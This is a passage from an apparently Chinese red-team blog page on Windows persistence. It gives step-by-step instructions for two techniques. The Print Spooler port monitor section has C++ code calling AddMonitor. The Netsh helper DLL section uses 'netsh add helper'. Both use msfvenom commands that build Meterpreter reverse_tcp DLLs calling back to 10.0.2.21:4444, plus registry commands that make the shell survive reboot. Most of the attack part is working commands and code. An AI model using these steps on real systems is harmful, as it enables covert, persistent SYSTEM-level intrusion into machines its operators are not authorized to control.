https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135146932-2098684535.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111135146932-2098684535.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="print-spooler端口监视器" class="heading-element"><span>Print Spooler端口监视器</span>
  <a href="#print-spooler%e7%ab%af%e5%8f%a3%e7%9b%91%e8%a7%86%e5%99%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>后台打印程序服务负责管理Windows操作系统中的打印作业。与服务的交互通过打印后台处理程序API执行，**该API包含一个函数（AddMonitor），可用于安装本地端口监视器并连接配置、数据和监视器文件。**此函数能够将DLL注入spoolsv.exe进程，并且通过创建注册表项，red team operator可以在系统上实现持久性。</p>
<p><a href="https://twitter.com/silentbreaksec"target="_blank" rel="external nofollow noopener noreferrer">Brady Bloxham</a>在<a href="https://www.youtube.com/watch?v=dq2Hv7J9fvk"target="_blank" rel="external nofollow noopener noreferrer">Defcon 22上</a>演示了这种持久性技术。应该注意的是，此技术需要管理员级别的特权，并且DLL必须拖放到磁盘上。<a href="https://twitter.com/spotheplanet"target="_blank" rel="external nofollow noopener noreferrer">Mantvydas Baranauskas</a>在他的<a href="https://ired.team/offensive-security/persistence/t1013-addmonitor"target="_blank" rel="external nofollow noopener noreferrer">网站上</a>使用了以下代码，作为他的红队笔记的一部分。</p>
<p>该<strong>WINDOWS.H</strong>报头包括<strong>Winspool.h</strong>这是由微软规范所需的头。该<strong>MONITOR_INFO_2</strong>用于指定必要的监控细节是：</p>
<ul>
<li><strong>pName</strong> //监视器名称</li>
<li><strong>pEnvironment</strong> //环境架构</li>
<li><strong>pDLLName</strong> //监视器DLL文件的名称</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include</span> <span style="color:#828b96;font-style:italic">&#34;Windows.h&#34;</span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">MONITOR_INFO_2</span> <span style="color:#58a1dd">monitorInfo</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">TCHAR</span> <span style="color:#58a1dd">env</span>[<span style="color:#a6be9d">12</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;Windows x64&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">TCHAR</span> <span style="color:#58a1dd">name</span>[<span style="color:#a6be9d">12</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;Monitor&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">TCHAR</span> <span style="color:#58a1dd">dll</span>[<span style="color:#a6be9d">12</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;test.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">monitorInfo</span>.<span style="color:#58a1dd">pName</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">monitorInfo</span>.<span style="color:#58a1dd">pEnvironment</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">env</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">monitorInfo</span>.<span style="color:#58a1dd">pDLLName</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dll</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">AddMonitor</span>(<span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">2</span>, (<span style="color:#58a1dd">LPBYTE</span>)<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">monitorInfo</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140023331-952117864.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140023331-952117864.png" alt="AddMonitor功能" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140023331-952117864.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140023331-952117864.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140023331-952117864.png?size=large 2x" data-title="AddMonitor功能" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>编译代码将生成一个可执行文件（在本例中为Monitors.exe），该可执行文件将在系统上执行恶意DLL（test.dll）的注册。Metasploit框架可用于生成将服务于Meterpreter有效负载的DLL文件。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>10.0.2.21 <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4444</span> -f dll &gt; test.dll</span></span></code></pre></div><p>该DLL必须复制到System32文件夹上，因为根据Microsoft <a href="https://docs.microsoft.com/en-us/windows/win32/printdocs/addmonitor"target="_blank" rel="external nofollow noopener noreferrer">文档，</a>这是<strong>AddMonitor</strong>函数的预期位置，以便加载相关的DLL 。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>copy C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\p</span>entestlab<span style="color:#a6be9d">\D</span>esktop<span style="color:#a6be9d">\t</span>est.dll C:<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\S</span>ystem32
</span></span><span style="display:flex;"><span>Monitors.exe</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140042168-154593214.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140042168-154593214.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140042168-154593214.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140042168-154593214.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140042168-154593214.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>Monitors.exe必须与恶意DLL位于同一文件夹（System32）中。执行该文件将与Meterpreter建立通信。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140102723-1846881912.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140102723-1846881912.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140102723-1846881912.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140102723-1846881912.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140102723-1846881912.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>但是，为了实现持久性，在“ <strong>Monitors</strong> ”注册表位置下需要一个密钥。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">HKEY_LOCAL_MACHINE</span>\<span style="color:#58a1dd">SYSTEM</span>\<span style="color:#58a1dd">CurrentControlSet</span>\<span style="color:#58a1dd">Control</span>\<span style="color:#58a1dd">Print</span>\<span style="color:#58a1dd">Monitors</span></span></span></code></pre></div><p>以下命令将创建一个注册表项，该注册表项将包含值<strong>test.dll</strong>。从编辑器中查看注册表将验证密钥是否已创建。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;hklm\system\currentcontrolset\control\print\monitors\Pentestlab&#34;</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">v</span> <span style="color:#a6be9d">&#34;Driver&#34;</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;test.dll&#34;</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140129246-835720952.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140129246-835720952.png" alt="端口监视器–注册表项" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140129246-835720952.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140129246-835720952.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140129246-835720952.png?size=large 2x" data-title="端口监视器–注册表项" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>下次重新启动时，spoolsv.exe进程将加载Monitors注册表项中存在并存储在Windows文件夹System32中的所有驱动程序DLL文件。</p>
<p>下图演示了Meterpreter会话已建立与Print Spooler服务（SYSTEM）相同级别的特权，并且已从System32文件夹（已删除test.dll的文件夹）执行了执行。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140147135-1226211952.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140147135-1226211952.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140147135-1226211952.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140147135-1226211952.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140147135-1226211952.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="netsh-helper-dll" class="heading-element"><span>Netsh Helper DLL</span>
  <a href="#netsh-helper-dll" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。</p>
<p>生成恶意的DLL</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>10.0.2.21 <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4444</span> -f dll &gt; /tmp/pentestlab.dll</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140516717-991869726.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140516717-991869726.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140516717-991869726.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140516717-991869726.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140516717-991869726.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>添加助手dll</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">add</span> <span style="color:#58a1dd">helper</span> <span style="color:#58a1dd">path-to</span><span style="color:#58a1dd">-malicious-dll</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140547648-995495170.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140547648-995495170.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140547648-995495170.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140547648-995495170.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140547648-995495170.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>每次netsh实用程序启动时，都会执行DLL，并且将建立通信。</p>
<p>但是，默认情况下，netsh没有计划自动启动。创建将在Windows启动期间执行实用程序的注册表项将在主机上创建持久性。这可以直接从Meterpreter会话或Windows Shell中完成。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#58a1dd">Pentestlab</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;C:\Windows\SysWOW64\netsh&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">setval</span> <span style="color:#58a1dd">-k</span> <span style="color:#58a1dd">HKLM</span>\\<span style="color:#58a1dd">software</span>\\<span style="color:#58a1dd">microsoft</span>\\<span style="color:#58a1dd">windows</span>\\<span style="color:#58a1dd">currentversion</span>\\<span style="color:#58a1dd">run</span>\\ <span style="color:#58a1dd">-v</span> <span style="color:#58a1dd">pentestlab</span> <span style="color:#58a1dd">-d</span> <span style="color:#a6be9d">&#39;C:\Windows\SysWOW64\netsh&#39;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140618646-1764925445.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140618646-1764925445.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140618646-1764925445.png?size=small, 